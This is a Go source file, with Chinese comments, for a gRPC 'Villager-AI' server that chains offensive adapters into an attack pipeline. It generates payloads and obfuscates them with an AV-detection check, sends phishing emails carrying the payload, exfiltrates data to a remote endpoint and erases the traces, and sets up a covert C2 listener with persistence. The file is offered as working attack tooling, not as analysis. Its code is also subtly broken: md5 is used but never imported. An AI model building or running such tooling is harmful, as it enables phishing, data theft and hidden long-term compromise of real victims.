package main

import (
	"context"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	core "github.com/OpenClaw-Security/Stealth-Core/pkg/proto"
	hexstrikepb "github.com/OpenClaw-Security/Stealth-Core/pkg/proto/hexstrike"
	netrunnerspb "github.com/OpenClaw-Security/Stealth-Core/pkg/proto/netrunners"
	thesilencerpb "github.com/OpenClaw-Security/Stealth-Core/pkg/proto/thesilencer"
	villagerpb "github.com/OpenClaw-Security/Stealth-Core/pkg/proto/villager_ai"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure" // For grpc.WithInsecure()
)

type VillagerAIServer struct {
	villagerpb.UnimplementedVillagerAIAdapterServer
	hexstrikeClient   hexstrikepb.HexstrikeAdapterClient
	thesilencerClient thesilencerpb.TheSilencerAdapterClient
	netrunnersClient  netrunnerspb.NetRunnersAdapterClient
}

func NewVillagerAIServer(hexAddr, silencerAddr, netrunnersAddr string) (*VillagerAIServer, error) {
	// 连接到 Hexstrike Adapter
	hexConn, err := grpc.Dial(hexAddr, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		return nil, fmt.Errorf("failed to connect to Hexstrike adapter: %w", err)
	}
	hexClient := hexstrikepb.NewHexstrikeAdapterClient(hexConn)

	// 连接到 TheSilencer Adapter
	silencerConn, err := grpc.Dial(silencerAddr, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		return nil, fmt.Errorf("failed to connect to TheSilencer adapter: %w", err)
	}
	silencerClient := thesilencerpb.NewTheSilencerAdapterClient(silencerConn)

	// 连接到 Net-Runners Adapter
	netrunnersConn, err := grpc.Dial(netrunnersAddr, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		return nil, fmt.Errorf("failed to connect to Net-Runners adapter: %w", err)
	}
	netrunnersClient := netrunnerspb.NewNetRunnersAdapterClient(netrunnersConn)

	return &VillagerAIServer{
		hexstrikeClient:   hexClient,
		thesilencerClient: silencerClient,
		netrunnersClient:  netrunnersClient,
	}, nil
}

func (s *VillagerAIServer) Execute(ctx context.Context, req *core.OperationRequest) (*core.OperationResponse, error) {
	log.Printf("Executing Villager-AI fusion operation: %s", req.Command)

	switch req.Command {
	case "generate_stealthy_payload":
		return s.generateStealthyPayloadWrapper(ctx, req.Params)
	case "launch_covert_phishing":
		return s.launchCovertPhishingWrapper(ctx, req.Params)
	case "automated_exfiltration":
		return s.automatedExfiltrationWrapper(ctx, req.Params)
	case "deploy_c2_persistence":
		return s.deployC2PersistenceWrapper(ctx, req.Params)
	default:
		return nil, fmt.Errorf("unknown command for Villager-AI: %s", req.Command)
	}
}

// generateStealthyPayload 融合功能：生成载荷 -> 混淆 -> 检测
func (s *VillagerAIServer) GenerateStealthyPayload(ctx context.Context, req *villagerpb.GenerateStealthyPayloadRequest) (*villagerpb.GenerateStealthyPayloadResponse, error) {
	log.Printf("Villager-AI: Generating stealthy payload of type %s with obfuscation %s", req.BasePayloadType, req.ObfuscationTechnique)

	// 1. 调用 Hexstrike 生成基础载荷
	generateReq := &hexstrikepb.GeneratePayloadRequest{
		Type:    req.BasePayloadType,
		Lhost:   req.HexstrikeOptions["lhost"], // 从选项中获取
		Lport:   req.HexstrikeOptions["lport"],
		Options: req.HexstrikeOptions,
	}
	generateResp, err := s.hexstrikeClient.GeneratePayload(ctx, generateReq)
	if err != nil {
		return nil, fmt.Errorf("Hexstrike payload generation failed: %w", err)
	}
	rawPayloadPath := generateResp.PayloadPath
	originalHash, _ := calculateFileHash(rawPayloadPath) // 辅助函数

	// 2. 调用 TheSilencer 混淆载荷
	obfuscateReq := &thesilencerpb.ObfuscateRequest{
		InputPath: rawPayloadPath,
		Technique: req.ObfuscationTechnique,
		Options:   req.ThesilencerOptions,
	}
	obfuscateResp, err := s.thesilencerClient.ObfuscateFile(ctx, obfuscateReq)
	if err != nil {
		return nil, fmt.Errorf("TheSilencer obfuscation failed: %w", err)
	}
	finalPayloadPath := obfuscateResp.OutputPath
	obfuscatedHash, _ := calculateFileHash(finalPayloadPath) // 辅助函数

	// 3. 调用 TheSilencer 进行检测
	detectReq := &thesilencerpb.DetectionRequest{
		FilePath:  finalPayloadPath,
		AvEngines: []string{"default"}, // 可以从选项中获取
	}
	detectionResp, err := s.thesilencerClient.DetectAV(ctx, detectReq)
	if err != nil {
		log.Printf("Warning: TheSilencer AV detection failed: %v", err)
		detectionResp = &thesilencerpb.DetectionResponse{Detected: false, Score: 0}
	}

	return &villagerpb.GenerateStealthyPayloadResponse{
		FinalPayloadPath: finalPayloadPath,
		OriginalHash:     originalHash,
		ObfuscatedHash:   obfuscatedHash,
		DetectionResults: detectionResp,
	}, nil
}

// 封装成 core.OperationResponse
func (s *VillagerAIServer) generateStealthyPayloadWrapper(ctx context.Context, params map[string]string) (*core.OperationResponse, error) {
	req := &villagerpb.GenerateStealthyPayloadRequest{
		BasePayloadType:     params["base_payload_type"],
		ObfuscationTechnique: params["obfuscation_technique"],
		HexstrikeOptions:    map[string]string{"lhost": params["lhost"], "lport": params["lport"]}, // 简化，实际应更灵活
		ThesilencerOptions:  map[string]string{"level": "high"},
	}
	resp, err := s.GenerateStealthyPayload(ctx, req)
	if err != nil {
		return &core.OperationResponse{Success: false, Error: err.Error()}, nil
	}
	return &core.OperationResponse{
		Success: true,
		Output:  fmt.Sprintf("Generated stealthy payload: %s", resp.FinalPayloadPath),
		Artifacts: map[string]string{
			"final_payload_path": resp.FinalPayloadPath,
			"detection_score":    fmt.Sprintf("%d", resp.DetectionResults.Score),
		},
	}, nil
}

// launchCovertPhishing 融合功能：投递载荷
func (s *VillagerAIServer) LaunchCovertPhishing(ctx context.Context, req *villagerpb.LaunchCovertPhishingRequest) (*villagerpb.LaunchCovertPhishingResponse, error) {
	log.Printf("Villager-AI: Launching covert phishing campaign '%s' with payload %s", req.CampaignName, req.PayloadPath)

	// 1. 调用 Hexstrike 发送钓鱼邮件
	emailReq := &hexstrikepb.PhishingRequest{
		TemplateName:   req.PhishingTemplate,
		Subject:        req.HexstrikeEmailOptions["subject"],
		AttachmentPath: req.PayloadPath,
		Recipients:     req.Recipients,
		SmtpConfig:     req.HexstrikeEmailOptions,
	}
	emailResp, err := s.hexstrikeClient.SendPhishingEmail(ctx, emailReq)
	if err != nil {
		return nil, fmt.Errorf("Hexstrike phishing email failed: %w", err)
	}

	return &villagerpb.LaunchCovertPhishingResponse{
		Success:          true,
		SentCount:        emailResp.SentCount,
		FailedRecipients: emailResp.FailedRecipients,
		CampaignId:       fmt.Sprintf("campaign-%s-%d", req.CampaignName, time.Now().Unix()),
	}, nil
}

func (s *VillagerAIServer) launchCovertPhishingWrapper(ctx context.Context, params map[string]string) (*core.OperationResponse, error) {
	req := &villagerpb.LaunchCovertPhishingRequest{
		CampaignName:    params["campaign_name"],
		PayloadPath:     params["payload_path"],
		PhishingTemplate: params["phishing_template"],
		Recipients:      []string{params["recipient"]}, // 简化
		HexstrikeEmailOptions: map[string]string{"subject": params["subject"], "smtp_server": params["smtp_server"]},
	}
	resp, err := s.LaunchCovertPhishing(ctx, req)
	if err != nil {
		return &core.OperationResponse{Success: false, Error: err.Error()}, nil
	}
	return &core.OperationResponse{
		Success: true,
		Output:  fmt.Sprintf("Launched phishing campaign %s. Sent to %d recipients.", resp.CampaignId, resp.SentCount),
		Artifacts: map[string]string{
			"campaign_id": resp.CampaignId,
			"sent_count":  fmt.Sprintf("%d", resp.SentCount),
		},
	}, nil
}

// automatedExfiltration 融合功能：数据渗出
func (s *VillagerAIServer) AutomatedExfiltration(ctx context.Context, req *villagerpb.AutomatedExfiltrationRequest) (*villagerpb.AutomatedExfiltrationResponse, error) {
	log.Printf("Villager-AI: Automating exfiltration of %s to %s via %s", req.SourceDataPath, req.DestinationEndpoint, req.ExfiltrationMethod)

	// 1. 调用 Net-Runners 进行数据渗出
	exfilReq := &netrunnerspb.ExfiltrationRequest{
		DataPath:    req.SourceDataPath,
		Method:      req.ExfiltrationMethod,
		Destination: req.DestinationEndpoint,
		Encryption:  req.NetrunnersOptions, // 假定选项中包含加密配置
	}
	exfilResp, err := s.netrunnersClient.ExfiltrateData(ctx, exfilReq)
	if err != nil {
		return nil, fmt.Errorf("Net-Runners exfiltration failed: %w", err)
	}

	// 2. 调用 TheSilencer 清理痕迹
	cleanupReq := &thesilencerpb.CleanupRequest{
		Paths:  []string{req.SourceDataPath}, // 清理源数据路径
		Method: req.ThesilencerCleanupOptions["method"],
	}
	_, err = s.thesilencerClient.CleanTraces(ctx, cleanupReq)
	if err != nil {
		log.Printf("Warning: TheSilencer cleanup failed: %v", err)
	}

	return &villagerpb.AutomatedExfiltrationResponse{
		Success:             exfilResp.Success,
		ExfiltrationReportPath: "report.json", // 实际应生成报告
		TotalBytesExfiltrated: exfilResp.BytesSent,
	}, nil
}

func (s *VillagerAIServer) automatedExfiltrationWrapper(ctx context.Context, params map[string]string) (*core.OperationResponse, error) {
	req := &villagerpb.AutomatedExfiltrationRequest{
		SourceDataPath:      params["source_data_path"],
		DestinationEndpoint: params["destination_endpoint"],
		ExfiltrationMethod:  params["exfiltration_method"],
		NetrunnersOptions:   map[string]string{"encryption": "aes256"},
		ThesilencerCleanupOptions: map[string]string{"method": "secure_delete"},
	}
	resp, err := s.AutomatedExfiltration(ctx, req)
	if err != nil {
		return &core.OperationResponse{Success: false, Error: err.Error()}, nil
	}
	return &core.OperationResponse{
		Success: true,
		Output:  fmt.Sprintf("Automated exfiltration completed. Bytes sent: %d", resp.TotalBytesExfiltrated),
		Artifacts: map[string]string{
			"total_bytes_exfiltrated": fmt.Sprintf("%d", resp.TotalBytesExfiltrated),
		},
	}, nil
}

// DeployCovertC2AndPersistence 融合功能：部署 C2 和持久化
func (s *VillagerAIServer) DeployCovertC2AndPersistence(ctx context.Context, req *villagerpb.DeployC2PersistenceRequest) (*villagerpb.DeployC2PersistenceResponse, error) {
	log.Printf("Villager-AI: Deploying covert C2 and persistence with method %s", req.PersistenceMethod)

	// 1. 调用 Net-Runners 部署隐蔽 C2 监听器
	listenerReq := &netrunnerspb.ListenerRequest{
		Protocol: req.C2Protocol,
		Domain:   req.NetrunnersC2Options["domain"],
		Port:     req.NetrunnersC2Options["port"],
		Options:  req.NetrunnersC2Options,
	}
	listenerResp, err := s.netrunnersClient.SetupListener(ctx, listenerReq)
	if err != nil {
		return nil, fmt.Errorf("Net-Runners C2 listener setup failed: %w", err)
	}
	c2Info := listenerResp.ConnectionString

	// 2. 调用 Hexstrike 实现持久化
	persistenceReq := &hexstrikepb.ExploitRequest{
		Target:      "local_host", // 或实际目标
		Vulnerability: "persistence",
		Payload:     req.PayloadPath,
		Options:     req.HexstrikePersistenceOptions,
	}
	persistenceResp, err := s.hexstrikeClient.ExploitVulnerability(ctx, persistenceReq)
	if err != nil {
		return nil, fmt.Errorf("Hexstrike persistence failed: %w", err)
	}

	return &villagerpb.DeployC2PersistenceResponse{
		Success:          persistenceResp.Success,
		C2ListenerInfo:   c2Info,
		PersistenceReport: persistenceResp.Output,
	}, nil
}

func (s *VillagerAIServer) deployC2PersistenceWrapper(ctx context.Context, params map[string]string) (*core.OperationResponse, error) {
	req := &villagerpb.DeployC2PersistenceRequest{
		PayloadPath:       params["payload_path"],
		PersistenceMethod: params["persistence_method"],
		C2Protocol:        params["c2_protocol"],
		NetrunnersC2Options: map[string]string{"domain": params["c2_domain"], "port": params["c2_port"]},
		HexstrikePersistenceOptions: map[string]string{"technique": params["persistence_method"]},
	}
	resp, err := s.DeployCovertC2AndPersistence(ctx, req)
	if err != nil {
		return &core.OperationResponse{Success: false, Error: err.Error()}, nil
	}
	return &core.OperationResponse{
		Success: true,
		Output:  fmt.Sprintf("Deployed C2 listener: %s. Persistence report: %s", resp.C2ListenerInfo, resp.PersistenceReport),
		Artifacts: map[string]string{
			"c2_listener":     resp.C2ListenerInfo,
			"persistence_report": resp.PersistenceReport,
		},
	}, nil
}


func (s *VillagerAIServer) GetCapabilities(ctx context.Context, empty *core.Empty) (*core.CapabilityList, error) {
	return &core.CapabilityList{
		Commands: []string{
			"generate_stealthy_payload",
			"launch_covert_phishing",
			"automated_exfiltration",
			"deploy_c2_persistence",
		},
	}, nil
}

func (s *VillagerAIServer) HealthCheck(ctx context.Context, empty *core.Empty) (*core.HealthStatus, error) {
	// 检查所有依赖的子适配器健康状态
	hexHealth, err := s.hexstrikeClient.HealthCheck(ctx, &core.Empty{})
	if err != nil || hexHealth.Status != "healthy" {
		return &core.HealthStatus{Status: "unhealthy", Version: "fusion-partial"}, nil
	}
	silencerHealth, err := s.thesilencerClient.HealthCheck(ctx, &core.Empty{})
	if err != nil || silencerHealth.Status != "healthy" {
		return &core.HealthStatus{Status: "unhealthy", Version: "fusion-partial"}, nil
	}
	netrunnersHealth, err := s.netrunnersClient.HealthCheck(ctx, &core.Empty{})
	if err != nil || netrunnersHealth.Status != "healthy" {
		return &core.HealthStatus{Status: "unhealthy", Version: "fusion-partial"}, nil
	}
	
	return &core.HealthStatus{
		Status:  "healthy",
		Version: "1.0-fusion",
	}, nil
}

func main() {
	// 适配器地址
	hexstrikeAddr := os.Getenv("HEXSTRIKE_ADAPTER_ADDR")
	if hexstrikeAddr == "" {
		hexstrikeAddr = "localhost:50051"
	}
	silencerAddr := os.Getenv("THESILENCER_ADAPTER_ADDR")
	if silencerAddr == "" {
		silencerAddr = "localhost:50052"
	}
	netrunnersAddr := os.Getenv("NETRUNNERS_ADAPTER_ADDR")
	if netrunnersAddr == "" {
		netrunnersAddr = "localhost:50053"
	}

	server, err := NewVillagerAIServer(hexstrikeAddr, silencerAddr, netrunnersAddr)
	if err != nil {
		log.Fatalf("failed to create Villager-AI server: %v", err)
	}
	
	lis, err := net.Listen("tcp", ":50054")
	if err != nil {
		log.Fatalf("failed to listen: %v", err)
	}
	
	grpcServer := grpc.NewServer()
	villagerpb.RegisterVillagerAIAdapterServer(grpcServer, server)
	
	log.Printf("Villager-AI Adapter Server listening on :50054")
	if err := grpcServer.Serve(lis); err != nil {
		log.Fatalf("failed to serve: %v", err)
	}
}

// 辅助函数：计算文件哈希 (重复定义，实际应放在一个公共工具包)
func calculateFileHash(filePath string) (string, error) {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("%x", md5.Sum(data)), nil
}
